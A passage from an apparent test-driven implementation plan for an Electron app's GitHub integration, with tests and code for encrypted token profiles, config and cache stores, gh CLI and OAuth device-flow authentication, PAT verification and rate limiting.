git commit -m "feat(github): add scope→capability mapper (classic + fine-grained + oauth)"
```

---

### Task B2: AuthProfile store with safeStorage

**Files:** Create `src/main/github/auth/auth-profile-store.ts`. Uses existing `config-manager.ts` for path resolution.

- [ ] **Step 1: Inspect existing config-manager to understand paths**

Run: `grep -n "getConfigPath\|resourcesDir\|CONFIG_DIR" F:/CLAUDE_MULTI_APP/src/main/config-manager.ts | head -20`

Note: the config manager resolves paths within the user-selected resources dir. We'll add a helper that gets the GitHub config file path.

- [ ] **Step 2: Write failing test**

```ts
// tests/unit/github/auth-profile-store.test.ts
import { describe, it, expect, beforeEach, vi } from 'vitest'
import { AuthProfileStore } from '../../../src/main/github/auth/auth-profile-store'

vi.mock('electron', () => ({
  safeStorage: {
    isEncryptionAvailable: () => true,
    encryptString: (s: string) => Buffer.from('enc:' + s),
    decryptString: (b: Buffer) => b.toString().replace(/^enc:/, ''),
  },
}))

describe('AuthProfileStore', () => {
  let store: AuthProfileStore
  let memory: { config?: any } = {}

  beforeEach(() => {
    memory = {}
    store = new AuthProfileStore({
      readConfig: async () => memory.config ?? null,
      writeConfig: async (c) => { memory.config = c },
    })
  })

  it('adds a profile with encrypted token', async () => {
    const id = await store.addProfile({
      kind: 'pat-fine-grained',
      label: 'nubbymong',
      username: 'nubbymong',
      scopes: ['pull_requests'],
      capabilities: ['pulls'],
      rawToken: 'github_pat_ABC',
      expiryObservable: true,
    })
    expect(id).toBeTruthy()
    expect(memory.config.authProfiles[id].tokenCiphertext).toContain('enc:github_pat_ABC')
    expect(memory.config.authProfiles[id].tokenCiphertext).not.toBe('github_pat_ABC')
  })

  it('retrieves decrypted token', async () => {
    const id = await store.addProfile({
      kind: 'pat-classic',
      label: 'x',
      username: 'x',
      scopes: [],
      capabilities: [],
      rawToken: 'ghp_SECRET',
      expiryObservable: false,
    })
    const token = await store.getToken(id)
    expect(token).toBe('ghp_SECRET')
  })

  it('removes profile', async () => {
    const id = await store.addProfile({
      kind: 'oauth', label: 'x', username: 'x', scopes: [], capabilities: [],
      rawToken: 'gho_x', expiryObservable: false,
    })
    await store.removeProfile(id)
    expect(memory.config.authProfiles[id]).toBeUndefined()
  })

  it('returns null for non-existent profile token', async () => {
    expect(await store.getToken('missing')).toBeNull()
  })

  it('skips token encryption for gh-cli kind', async () => {
    const id = await store.addProfile({
      kind: 'gh-cli', label: 'cli', username: 'foo', scopes: [], capabilities: [],
      ghCliUsername: 'foo', expiryObservable: false,
    })
    expect(memory.config.authProfiles[id].tokenCiphertext).toBeUndefined()
    expect(memory.config.authProfiles[id].ghCliUsername).toBe('foo')
  })
})
```

- [ ] **Step 3: Run — expect fail**

Run: `npx vitest run tests/unit/github/auth-profile-store.test.ts`
Expected: FAIL.

- [ ] **Step 4: Create implementation**

```ts
// src/main/github/auth/auth-profile-store.ts
import { safeStorage } from 'electron'
import { randomUUID } from 'node:crypto'
import type { AuthProfile, GitHubConfig } from '../../../shared/github-types'
import {
  GITHUB_CONFIG_SCHEMA_VERSION,
  DEFAULT_SYNC_INTERVALS,
  DEFAULT_FEATURE_TOGGLES,
} from '../../../shared/github-constants'

export interface AuthProfileStoreIO {
  readConfig(): Promise<GitHubConfig | null>
  writeConfig(config: GitHubConfig): Promise<void>
}

export interface AddProfileInput {
  kind: AuthProfile['kind']
  label: string
  username: string
  avatarUrl?: string
  scopes: string[]
  capabilities: AuthProfile['capabilities']
  allowedRepos?: string[]
  rawToken?: string
  ghCliUsername?: string
  expiresAt?: number
  expiryObservable: boolean
}

function emptyConfig(): GitHubConfig {
  return {
    schemaVersion: GITHUB_CONFIG_SCHEMA_VERSION,
    authProfiles: {},
    featureToggles: { ...DEFAULT_FEATURE_TOGGLES },
    syncIntervals: { ...DEFAULT_SYNC_INTERVALS },
    enabledByDefault: false,
    transcriptScanningOptIn: false,
  }
}

export class AuthProfileStore {
  constructor(private io: AuthProfileStoreIO) {}

  private async load(): Promise<GitHubConfig> {
    return (await this.io.readConfig()) ?? emptyConfig()
  }

  async addProfile(input: AddProfileInput): Promise<string> {
    const id = randomUUID()
    const config = await this.load()

    let tokenCiphertext: string | undefined
    if (input.rawToken && input.kind !== 'gh-cli') {
      if (!safeStorage.isEncryptionAvailable()) {
        throw new Error('OS keychain encryption unavailable; cannot store token')
      }
      tokenCiphertext = safeStorage.encryptString(input.rawToken).toString('base64')
    }

    const profile: AuthProfile = {
      id,
      kind: input.kind,
      label: input.label,
      username: input.username,
      avatarUrl: input.avatarUrl,
      scopes: input.scopes,
      capabilities: input.capabilities,
      allowedRepos: input.allowedRepos,
      tokenCiphertext,
      ghCliUsername: input.ghCliUsername,
      createdAt: Date.now(),
      lastVerifiedAt: Date.now(),
      expiresAt: input.expiresAt,
      expiryObservable: input.expiryObservable,
    }

    config.authProfiles[id] = profile
    await this.io.writeConfig(config)
    return id
  }

  async getToken(id: string): Promise<string | null> {
    const config = await this.load()
    const p = config.authProfiles[id]
    if (!p || !p.tokenCiphertext) return null
    const buf = Buffer.from(p.tokenCiphertext, 'base64')
    return safeStorage.decryptString(buf)
  }

  async removeProfile(id: string): Promise<void> {
    const config = await this.load()
    delete config.authProfiles[id]
    if (config.defaultAuthProfileId === id) {
      config.defaultAuthProfileId = undefined
    }
    await this.io.writeConfig(config)
  }

  async listProfiles(): Promise<AuthProfile[]> {
    const config = await this.load()
    return Object.values(config.authProfiles)
  }

  async updateProfile(id: string, patch: Partial<AuthProfile>): Promise<void> {
    const config = await this.load()
    const existing = config.authProfiles[id]
    if (!existing) throw new Error(`Profile not found: ${id}`)
    config.authProfiles[id] = { ...existing, ...patch, id }
    await this.io.writeConfig(config)
  }
}
```

Note: the test uses a fake `electron.safeStorage` via `vi.mock`. The test's `encryptString` returns Buffer that must be base64-decoded back to the `enc:...` form — since our production code does `.toString('base64')`, the mock must match. Update the test mock to return the base64-encoded form. Re-check test code: in the mock, `encryptString` returns `Buffer.from('enc:' + s)`. Our code `.toString('base64')`s that. On decrypt, we `Buffer.from(str, 'base64')` which gets us back the 'enc:'+s buffer, then `safeStorage.decryptString` (mocked) returns `s`. Correct.

- [ ] **Step 5: Run — expect pass**

Run: `npx vitest run tests/unit/github/auth-profile-store.test.ts`
Expected: 5 tests pass.

- [ ] **Step 6: Commit**

```bash
git add src/main/github/auth/auth-profile-store.ts tests/unit/github/auth-profile-store.test.ts
git commit -m "feat(github): AuthProfileStore with safeStorage-encrypted tokens"
```

---

### Task B3: GitHub config store (read/write github-config.json)

**Files:** Create `src/main/github/github-config-store.ts`, test.

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/github/github-config-store.test.ts
import { describe, it, expect, beforeEach } from 'vitest'
import { promises as fs } from 'node:fs'
import path from 'node:path'
import os from 'node:os'
import { GitHubConfigStore } from '../../../src/main/github/github-config-store'
import { GITHUB_CONFIG_SCHEMA_VERSION } from '../../../src/shared/github-constants'

describe('GitHubConfigStore', () => {
  let tmpDir: string
  let store: GitHubConfigStore

  beforeEach(async () => {
    tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'ghcfg-'))
    store = new GitHubConfigStore(tmpDir)
  })

  it('returns null when file does not exist', async () => {
    expect(await store.read()).toBeNull()
  })

  it('writes and reads back config', async () => {
    const config = {
      schemaVersion: GITHUB_CONFIG_SCHEMA_VERSION,
      authProfiles: {},
      featureToggles: {} as any,
      syncIntervals: { activeSessionSec: 60, backgroundSec: 300, notificationsSec: 180 },
      enabledByDefault: false,
      transcriptScanningOptIn: false,
    }
    await store.write(config)
    expect(await store.read()).toEqual(config)
  })

  it('atomic write: tmp file renames on success', async () => {
    await store.write({
      schemaVersion: GITHUB_CONFIG_SCHEMA_VERSION,
      authProfiles: {},
      featureToggles: {} as any,
      syncIntervals: { activeSessionSec: 60, backgroundSec: 300, notificationsSec: 180 },
      enabledByDefault: false,
      transcriptScanningOptIn: false,
    })
    const entries = await fs.readdir(tmpDir)
    expect(entries).toEqual(['github-config.json'])
  })

  it('handles corrupt JSON by returning null and logging', async () => {
    await fs.writeFile(path.join(tmpDir, 'github-config.json'), '{ not json', 'utf8')
    expect(await store.read()).toBeNull()
  })

  it('rejects unknown schemaVersion by returning null', async () => {
    await fs.writeFile(
      path.join(tmpDir, 'github-config.json'),
      JSON.stringify({ schemaVersion: 9999 }),
      'utf8',
    )
    expect(await store.read()).toBeNull()
  })
})
```

- [ ] **Step 2: Run — expect fail**

Run: `npx vitest run tests/unit/github/github-config-store.test.ts`
Expected: FAIL.

- [ ] **Step 3: Create implementation**

```ts
// src/main/github/github-config-store.ts
import { promises as fs } from 'node:fs'
import path from 'node:path'
import type { GitHubConfig } from '../../shared/github-types'
import { GITHUB_CONFIG_SCHEMA_VERSION } from '../../shared/github-constants'
import { redactTokens } from './security/token-redactor'

const FILENAME = 'github-config.json'

export class GitHubConfigStore {
  constructor(private dir: string) {}

  private get filePath() {
    return path.join(this.dir, FILENAME)
  }

  async read(): Promise<GitHubConfig | null> {
    try {
      const raw = await fs.readFile(this.filePath, 'utf8')
      const parsed = JSON.parse(raw)
      if (parsed.schemaVersion !== GITHUB_CONFIG_SCHEMA_VERSION) {
        console.warn(`[github-config] unknown schemaVersion ${parsed.schemaVersion}; ignoring file`)
        return null
      }
      return parsed as GitHubConfig
    } catch (err) {
      if ((err as NodeJS.ErrnoException).code === 'ENOENT') return null
      console.warn('[github-config] failed to read:', redactTokens(String(err)))
      return null
    }
  }

  async write(config: GitHubConfig): Promise<void> {
    const tmp = this.filePath + '.tmp'
    const body = JSON.stringify(config, null, 2)
    await fs.writeFile(tmp, body, 'utf8')
    await fs.rename(tmp, this.filePath)
  }
}
```

- [ ] **Step 4: Run — expect pass**

Run: `npx vitest run tests/unit/github/github-config-store.test.ts`
Expected: 5 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/main/github/github-config-store.ts tests/unit/github/github-config-store.test.ts
git commit -m "feat(github): GitHubConfigStore with atomic write + corruption tolerance"
```

---

## Phase C — Auth Tier 1: gh CLI delegation

### Task C1: gh auth status parser

**Files:** Create `src/main/github/auth/gh-cli-delegate.ts`, test.

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/github/gh-cli-delegate.test.ts
import { describe, it, expect, vi } from 'vitest'
import { parseGhAuthStatus, ghAuthToken } from '../../../src/main/github/auth/gh-cli-delegate'

describe('parseGhAuthStatus', () => {
  it('extracts usernames from multi-account output', () => {
    const out = `github.com
  ✓ Logged in to github.com account nubbymong (keyring)
  - Active account: true
  - Git operations protocol: https
  - Token: gho_****

  ✓ Logged in to github.com account personalacc (keyring)
  - Active account: false
`
    expect(parseGhAuthStatus(out)).toEqual(['nubbymong', 'personalacc'])
  })

  it('returns empty for not-logged-in', () => {
    expect(parseGhAuthStatus('You are not logged into any GitHub hosts.')).toEqual([])
  })

  it('ignores non-github.com hosts', () => {
    const out = `github.com
  ✓ Logged in to github.com account nubby (keyring)
ghe.example.com
  ✓ Logged in to ghe.example.com account foo (keyring)
`
    expect(parseGhAuthStatus(out)).toEqual(['nubby'])
  })
})

describe('ghAuthToken', () => {
  it('calls gh with --user and returns trimmed token', async () => {
    const run = vi.fn().mockResolvedValue('gho_xyz\n')
    const token = await ghAuthToken('nubbymong', run)
    expect(run).toHaveBeenCalledWith(['auth', 'token', '--user', 'nubbymong'])
    expect(token).toBe('gho_xyz')
  })
  it('throws on gh failure', async () => {
    const run = vi.fn().mockRejectedValue(new Error('gh failed'))
    await expect(ghAuthToken('x', run)).rejects.toThrow('gh failed')
  })
})
```

- [ ] **Step 2: Run — expect fail**

Run: `npx vitest run tests/unit/github/gh-cli-delegate.test.ts`
Expected: FAIL.

- [ ] **Step 3: Create implementation**

```ts
// src/main/github/auth/gh-cli-delegate.ts
import { spawn } from 'node:child_process'
import { redactTokens } from '../security/token-redactor'

export function parseGhAuthStatus(output: string): string[] {
  const lines = output.split(/\r?\n/)
  const users: string[] = []
  let inGithubCom = false
  for (const line of lines) {
    const hostMatch = line.match(/^(\S+)$/)
    if (hostMatch && (hostMatch[1] === 'github.com' || hostMatch[1].includes('.com'))) {
      inGithubCom = hostMatch[1] === 'github.com'
      continue
    }
    if (!inGithubCom) continue
    const m = line.match(/Logged in to github\.com account (\S+)/)
    if (m) users.push(m[1])
  }
  return users
}

export type RunGh = (args: string[]) => Promise<string>

export async function ghAuthToken(username: string, run: RunGh): Promise<string> {
  const out = await run(['auth', 'token', '--user', username])
  return out.trim()
}

export async function ghAuthStatus(run: RunGh): Promise<string[]> {
  try {
    const out = await run(['auth', 'status'])
    return parseGhAuthStatus(out)
  } catch (err) {
    console.warn('[gh-cli] auth status failed:', redactTokens(String(err)))
    return []
  }
}

export function defaultGhRun(): RunGh {
  return (args) =>
    new Promise<string>((resolve, reject) => {
      const proc = spawn('gh', args, { stdio: ['ignore', 'pipe', 'pipe'] })
      let stdout = ''
      let stderr = ''
      proc.stdout.on('data', (c) => (stdout += c.toString()))
      proc.stderr.on('data', (c) => (stderr += c.toString()))
      proc.on('error', reject)
      proc.on('close', (code) => {
        // `gh auth status` writes to stderr AND returns 0; combine outputs
        const combined = stdout + stderr
        if (code !== 0 && !combined) reject(new Error(`gh exited with ${code}`))
        else resolve(combined)
      })
    })
}
```

- [ ] **Step 4: Run — expect pass**

Run: `npx vitest run tests/unit/github/gh-cli-delegate.test.ts`
Expected: 5 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/main/github/auth/gh-cli-delegate.ts tests/unit/github/gh-cli-delegate.test.ts
git commit -m "feat(github): gh CLI delegate (parser + token fetcher with mandatory --user)"
```

---

## Phase D — Auth Tier 2: OAuth Device Flow

### Task D1: Device flow request + poll

**Files:** Create `src/main/github/auth/oauth-device-flow.ts`, test.

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/github/oauth-device-flow.test.ts
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import {
  requestDeviceCode,
  pollForAccessToken,
} from '../../../src/main/github/auth/oauth-device-flow'

const originalFetch = globalThis.fetch

beforeEach(() => {
  vi.useFakeTimers()
})
afterEach(() => {
  vi.useRealTimers()
  globalThis.fetch = originalFetch
})

describe('requestDeviceCode', () => {
  it('POSTs to device code URL and returns parsed response', async () => {
    globalThis.fetch = vi.fn(async () => ({
      ok: true,
      json: async () => ({
        device_code: 'D1',
        user_code: 'UC-UC',
        verification_uri: 'https://github.com/login/device',
        expires_in: 900,
        interval: 5,
      }),
    })) as any
    const resp = await requestDeviceCode('public_repo')
    expect(resp.user_code).toBe('UC-UC')
    expect(globalThis.fetch).toHaveBeenCalledWith(
      expect.stringContaining('login/device/code'),
      expect.objectContaining({ method: 'POST' }),
    )
  })
})

describe('pollForAccessToken', () => {
  it('returns token when ready', async () => {
    globalThis.fetch = vi
      .fn()
      .mockResolvedValueOnce({
        ok: true,
        json: async () => ({ error: 'authorization_pending' }),
      })
      .mockResolvedValueOnce({
        ok: true,
        json: async () => ({ access_token: 'gho_abc', scope: 'public_repo' }),
      }) as any

    const promise = pollForAccessToken('D1', 1)
    await vi.advanceTimersByTimeAsync(2000)
    await vi.runAllTimersAsync()
    const res = await promise
    expect(res.access_token).toBe('gho_abc')
  })

  it('throws on access_denied', async () => {
    globalThis.fetch = vi.fn(async () => ({
      ok: true,
      json: async () => ({ error: 'access_denied' }),
    })) as any
    await expect(pollForAccessToken('D1', 1)).rejects.toThrow(/access_denied/)
  })

  it('applies slow_down interval bump', async () => {
    globalThis.fetch = vi
      .fn()
      .mockResolvedValueOnce({
        ok: true,
        json: async () => ({ error: 'slow_down', interval: 10 }),
      })
      .mockResolvedValueOnce({
        ok: true,
        json: async () => ({ access_token: 'gho_x' }),
      }) as any

    const promise = pollForAccessToken('D1', 1)
    await vi.advanceTimersByTimeAsync(11_000)
    await vi.runAllTimersAsync()
    const res = await promise
    expect(res.access_token).toBe('gho_x')
  })
})
```

- [ ] **Step 2: Run — expect fail**

Run: `npx vitest run tests/unit/github/oauth-device-flow.test.ts`
Expected: FAIL.

- [ ] **Step 3: Create implementation**

```ts
// src/main/github/auth/oauth-device-flow.ts
import {
  GITHUB_DEVICE_CODE_URL,
  GITHUB_OAUTH_CLIENT_ID,
  GITHUB_OAUTH_TOKEN_URL,
} from '../../../shared/github-constants'
import type { DeviceCodeResponse, OAuthTokenResponse } from '../../../shared/github-types'

export async function requestDeviceCode(scope: string): Promise<DeviceCodeResponse> {
  const body = new URLSearchParams({ client_id: GITHUB_OAUTH_CLIENT_ID, scope })
  const r = await fetch(GITHUB_DEVICE_CODE_URL, {
    method: 'POST',
    headers: { Accept: 'application/json', 'Content-Type': 'application/x-www-form-urlencoded' },
    body: body.toString(),
  })
  if (!r.ok) throw new Error(`device_code HTTP ${r.status}`)
  return (await r.json()) as DeviceCodeResponse
}

export async function pollForAccessToken(
  deviceCode: string,
  intervalSec: number,
): Promise<OAuthTokenResponse> {
  let currentInterval = Math.max(intervalSec, 1)
  while (true) {
    await sleep(currentInterval * 1000)
    const body = new URLSearchParams({
      client_id: GITHUB_OAUTH_CLIENT_ID,
      device_code: deviceCode,
      grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
    })
    const r = await fetch(GITHUB_OAUTH_TOKEN_URL, {
      method: 'POST',
      headers: { Accept: 'application/json', 'Content-Type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
    })
    const json = (await r.json()) as OAuthTokenResponse

    if (json.access_token) return json
    if (json.error === 'authorization_pending') continue
    if (json.error === 'slow_down') {
      currentInterval = json.interval ?? currentInterval + 5
      continue
    }
    if (json.error) throw new Error(`OAuth error: ${json.error}`)
  }
}

function sleep(ms: number): Promise<void> {
  return new Promise((res) => setTimeout(res, ms))
}
```

- [ ] **Step 4: Run — expect pass**

Run: `npx vitest run tests/unit/github/oauth-device-flow.test.ts`
Expected: 4 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/main/github/auth/oauth-device-flow.ts tests/unit/github/oauth-device-flow.test.ts
git commit -m "feat(github): OAuth device flow (request code + poll with slow_down)"
```

---

## Phase E — Auth Tier 3: PAT

### Task E1: PAT verifier

**Files:** Create `src/main/github/auth/pat-verifier.ts`, test.

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/github/pat-verifier.test.ts
import { describe, it, expect, vi, afterEach } from 'vitest'
import { verifyToken, probeRepoAccess } from '../../../src/main/github/auth/pat-verifier'

const originalFetch = globalThis.fetch
afterEach(() => { globalThis.fetch = originalFetch })

describe('verifyToken', () => {
  it('returns username + scopes on 200', async () => {
    globalThis.fetch = vi.fn(async () => ({
      ok: true,
      status: 200,
      headers: { get: (h: string) => ({
        'x-oauth-scopes': 'repo, read:org',
        'github-authentication-token-expiration': '2026-07-01 12:00:00 UTC',
      })[h.toLowerCase()] ?? null },
      json: async () => ({ login: 'nubby', avatar_url: 'https://a/nubby.png' }),
    })) as any
    const r = await verifyToken('ghp_x')
    expect(r.username).toBe('nubby')
    expect(r.scopes).toEqual(['repo', 'read:org'])
    expect(r.avatarUrl).toBe('https://a/nubby.png')
    expect(r.expiresAt).toBeGreaterThan(Date.now())
  })
  it('returns null on 401', async () => {
    globalThis.fetch = vi.fn(async () => ({ ok: false, status: 401 })) as any
    expect(await verifyToken('bad')).toBeNull()
  })
})

describe('probeRepoAccess', () => {
  it('returns true on 200', async () => {
    globalThis.fetch = vi.fn(async () => ({ ok: true, status: 200 })) as any
    expect(await probeRepoAccess('ghp_x', 'a/b')).toBe(true)
  })
  it('returns false on 403 or 404', async () => {
    globalThis.fetch = vi.fn(async () => ({ ok: false, status: 403 })) as any
    expect(await probeRepoAccess('ghp_x', 'a/b')).toBe(false)
  })
})
```

- [ ] **Step 2: Run — expect fail**

Run: `npx vitest run tests/unit/github/pat-verifier.test.ts`
Expected: FAIL.

- [ ] **Step 3: Create implementation**

```ts
// src/main/github/auth/pat-verifier.ts
import { GITHUB_API_BASE } from '../../../shared/github-constants'

export interface VerifyResult {
  username: string
  avatarUrl?: string
  scopes: string[]
  expiresAt?: number
}

export async function verifyToken(token: string): Promise<VerifyResult | null> {
  const r = await fetch(`${GITHUB_API_BASE}/user`, {
    headers: {
      Authorization: `token ${token}`,
      Accept: 'application/vnd.github+json',
      'User-Agent': 'ClaudeCommandCenter',
    },
  })
  if (!r.ok) return null
  const user = (await r.json()) as { login: string; avatar_url?: string }
  const scopes = (r.headers.get('x-oauth-scopes') ?? '')
    .split(',')
    .map((s) => s.trim())
    .filter(Boolean)
  const expiryHeader = r.headers.get('github-authentication-token-expiration')
  const expiresAt = expiryHeader ? parseExpiryHeader(expiryHeader) : undefined
  return { username: user.login, avatarUrl: user.avatar_url, scopes, expiresAt }
}

export async function probeRepoAccess(token: string, slug: string): Promise<boolean> {
  const r = await fetch(`${GITHUB_API_BASE}/repos/${slug}`, {
    headers: {
      Authorization: `token ${token}`,
      Accept: 'application/vnd.github+json',
      'User-Agent': 'ClaudeCommandCenter',
    },
  })
  return r.ok
}

function parseExpiryHeader(raw: string): number | undefined {
  // Format: "2026-07-01 12:00:00 UTC"
  const iso = raw.replace(' UTC', 'Z').replace(' ', 'T')
  const t = Date.parse(iso)
  return Number.isNaN(t) ? undefined : t
}
```

- [ ] **Step 4: Run — expect pass**

Run: `npx vitest run tests/unit/github/pat-verifier.test.ts`
Expected: 4 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/main/github/auth/pat-verifier.ts tests/unit/github/pat-verifier.test.ts
git commit -m "feat(github): PAT verifier + repo access probe"
```

---

## Phase F — GitHub Client

### Task F1: ETag cache unit

**Files:** Create `src/main/github/client/etag-cache.ts`, test.

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/github/etag-cache.test.ts
import { describe, it, expect } from 'vitest'
import { EtagCache } from '../../../src/main/github/client/etag-cache'

describe('EtagCache', () => {
  it('stores and retrieves etag by key', () => {
    const c = new EtagCache({})
    c.set('GET /repos/a/b', '"abc"')
    expect(c.get('GET /repos/a/b')).toBe('"abc"')
  })
  it('returns undefined for missing', () => {
    expect(new EtagCache({}).get('missing')).toBeUndefined()
  })
  it('exposes backing map for persistence', () => {
    const store: Record<string, string> = {}
    const c = new EtagCache(store)
    c.set('k', 'v')
    expect(store.k).toBe('v')
  })
})
```

- [ ] **Step 2: Run — expect fail**

Run: `npx vitest run tests/unit/github/etag-cache.test.ts`
Expected: FAIL.

- [ ] **Step 3: Create implementation**

```ts
// src/main/github/client/etag-cache.ts
export class EtagCache {
  constructor(private backing: Record<string, string>) {}
  get(key: string): string | undefined {
    return this.backing[key]
  }
  set(key: string, etag: string): void {
    this.backing[key] = etag
  }
  delete(key: string): void {
    delete this.backing[key]
  }
}
```

- [ ] **Step 4: Run — expect pass**

Run: `npx vitest run tests/unit/github/etag-cache.test.ts`
Expected: 3 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/main/github/client/etag-cache.ts tests/unit/github/etag-cache.test.ts
git commit -m "feat(github): EtagCache wrapper around persisted map"
```

---

### Task F2: Rate limit shield

**Files:** Create `src/main/github/client/rate-limit-shield.ts`, test.

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/github/rate-limit-shield.test.ts
import { describe, it, expect } from 'vitest'
import { RateLimitShield } from '../../../src/main/github/client/rate-limit-shield'

describe('RateLimitShield', () => {
  it('allows request when unknown state', () => {
    const s = new RateLimitShield()
    expect(s.canCall('core', Date.now())).toBe(true)
  })
  it('updates from response headers', () => {
    const s = new RateLimitShield()
    const now = Date.now()
    s.update('core', { limit: 5000, remaining: 4000, resetAt: now + 3600000, capturedAt: now })
    expect(s.snapshot('core')?.remaining).toBe(4000)
  })
  it('blocks at <10% remaining', () => {
    const s = new RateLimitShield()
    const now = Date.now()
    s.update('core', { limit: 5000, remaining: 400, resetAt: now + 60000, capturedAt: now })
    expect(s.canCall('core', now)).toBe(false)
  })
  it('resumes after resetAt passes', () => {
    const s = new RateLimitShield()
    const now = Date.now()
    s.update('core', { limit: 5000, remaining: 400, resetAt: now + 60000, capturedAt: now })
    expect(s.canCall('core', now + 61_000)).toBe(true)
  })
  it('graphql bucket independent of core', () => {
    const s = new RateLimitShield()
    const now = Date.now()
    s.update('core', { limit: 5000, remaining: 400, resetAt: now + 60000, capturedAt: now })
    expect(s.canCall('graphql', now)).toBe(true)
  })
})
```

- [ ] **Step 2: Run — expect fail**

Run: `npx vitest run tests/unit/github/rate-limit-shield.test.ts`
Expected: FAIL.

- [ ] **Step 3: Implementation**

```ts
// src/main/github/client/rate-limit-shield.ts
import type { RateLimitSnapshot } from '../../../shared/github-types'

export type Bucket = 'core' | 'search' | 'graphql'

export class RateLimitShield {
  private buckets: Partial<Record<Bucket, RateLimitSnapshot>> = {}

  update(bucket: Bucket, snap: RateLimitSnapshot): void {
    this.buckets[bucket] = snap
  }

  snapshot(bucket: Bucket): RateLimitSnapshot | undefined {
    return this.buckets[bucket]
  }

  canCall(bucket: Bucket, now: number): boolean {
    const s = this.buckets[bucket]
    if (!s) return true
    if (now >= s.resetAt) return true
    return s.remaining >= Math.ceil(s.limit * 0.1)
  }

  nextAllowedAt(bucket: Bucket): number | null {
    const s = this.buckets[bucket]
    return s ? s.resetAt : null
  }
}
```

- [ ] **Step 4: Run — expect pass**

Run: `npx vitest run tests/unit/github/rate-limit-shield.test.ts`
Expected: 5 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/main/github/client/rate-limit-shield.ts tests/unit/github/rate-limit-shield.test.ts
git commit -m "feat(github): per-bucket rate-limit shield"
```

---

### Task F3: Cache store with LRU + corruption recovery

**Files:** Create `src/main/github/cache/cache-store.ts`, test.

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/github/cache-store.test.ts
import { describe, it, expect, beforeEach } from 'vitest'
import { promises as fs } from 'node:fs'
import path from 'node:path'
import os from 'node:os'
import { CacheStore } from '../../../src/main/github/cache/cache-store'
import { GITHUB_CACHE_SCHEMA_VERSION } from '../../../src/shared/github-constants'

describe('CacheStore', () => {
  let tmpDir: string
  let store: CacheStore

  beforeEach(async () => {
    tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'ghc-'))
    store = new CacheStore(tmpDir)
  })

  it('returns empty cache when file missing', async () => {
    const c = await store.load()
    expect(c.schemaVersion).toBe(GITHUB_CACHE_SCHEMA_VERSION)
    expect(c.repos).toEqual({})
    expect(c.lru).toEqual([])
  })

  it('persists and reloads', async () => {
    const c = await store.load()
    c.repos['a/b'] = { etags: {}, lastSynced: 1, accessedAt: 1 }
    c.lru = ['a/b']
    await store.save(c)
    const reloaded = await store.load()
    expect(reloaded.repos['a/b']).toBeDefined()
  })

  it('LRU evicts when over cap', async () => {
    const c = await store.load()
    for (let i = 0; i < 55; i++) {
      const key = `o/r${i}`
      c.repos[key] = { etags: {}, lastSynced: i, accessedAt: i }
      c.lru.push(key)
    }
    await store.save(c)
    const reloaded = await store.load()
    expect(Object.keys(reloaded.repos).length).toBeLessThanOrEqual(50)
    // The 5 oldest should be gone
    expect(reloaded.repos['o/r0']).toBeUndefined()
    expect(reloaded.repos['o/r54']).toBeDefined()
  })

  it('corrupt file: backs up and returns empty', async () => {
    await fs.writeFile(path.join(tmpDir, 'github-cache.json'), '{corrupt', 'utf8')
    const c = await store.load()
    expect(c.repos).toEqual({})
    const entries = await fs.readdir(tmpDir)
    expect(entries.some((e) => e.startsWith('github-cache.corrupt-'))).toBe(true)
  })

  it('keeps only 3 most recent corrupt backups', async () => {
    // Create 5 stale corrupt backups
    for (let i = 0; i < 5; i++) {
      const name = `github-cache.corrupt-${1000 + i}.json`
      await fs.writeFile(path.join(tmpDir, name), 'x', 'utf8')
    }
    // Now simulate a new corruption event
    await fs.writeFile(path.join(tmpDir, 'github-cache.json'), '{bad', 'utf8')
    await store.load()
    const entries = await fs.readdir(tmpDir)
    const corrupts = entries.filter((e) => e.startsWith('github-cache.corrupt-'))
    expect(corrupts.length).toBe(3)
  })
})
```

- [ ] **Step 2: Run — expect fail**

Run: `npx vitest run tests/unit/github/cache-store.test.ts`
Expected: FAIL.

- [ ] **Step 3: Implementation**

```ts
// src/main/github/cache/cache-store.ts
import { promises as fs } from 'node:fs'
import path from 'node:path'
import type { GitHubCache } from '../../../shared/github-types'
import {
  CACHE_CORRUPT_BACKUPS_KEEP,
  CACHE_MAX_REPOS,
  GITHUB_CACHE_SCHEMA_VERSION,
} from '../../../shared/github-constants'
import { redactTokens } from '../security/token-redactor'

const FILENAME = 'github-cache.json'

function emptyCache(): GitHubCache {
  return {
    schemaVersion: GITHUB_CACHE_SCHEMA_VERSION,
    repos: {},
    notificationsByProfile: {},
    lru: [],
  }
}

export class CacheStore {
  constructor(private dir: string) {}

  private get filePath() {
    return path.join(this.dir, FILENAME)
  }

  async load(): Promise<GitHubCache> {
    let raw: string
    try {
      raw = await fs.readFile(this.filePath, 'utf8')
    } catch (err) {
      if ((err as NodeJS.ErrnoException).code === 'ENOENT') return emptyCache()
      console.warn('[github-cache] read failed:', redactTokens(String(err)))
      return emptyCache()
    }
    try {
      const parsed = JSON.parse(raw)
      if (parsed.schemaVersion !== GITHUB_CACHE_SCHEMA_VERSION) {
        await this.backupCorrupt()
        return emptyCache()
      }
      return parsed as GitHubCache
    } catch {
      await this.backupCorrupt()
      return emptyCache()
    }
  }

  async save(cache: GitHubCache): Promise<void> {
    // LRU eviction
    const lru = cache.lru.filter((s) => s in cache.repos)
    while (Object.keys(cache.repos).length > CACHE_MAX_REPOS && lru.length > 0) {
      const evict = lru.shift()!
      delete cache.repos[evict]
    }
    cache.lru = lru
    const body = JSON.stringify(cache)
    const tmp = this.filePath + '.tmp'
    await fs.writeFile(tmp, body, 'utf8')
    await fs.rename(tmp, this.filePath)
  }

  private async backupCorrupt(): Promise<void> {
    const ts = Date.now()
    const dest = path.join(this.dir, `github-cache.corrupt-${ts}.json`)
    try {
      await fs.rename(this.filePath, dest)
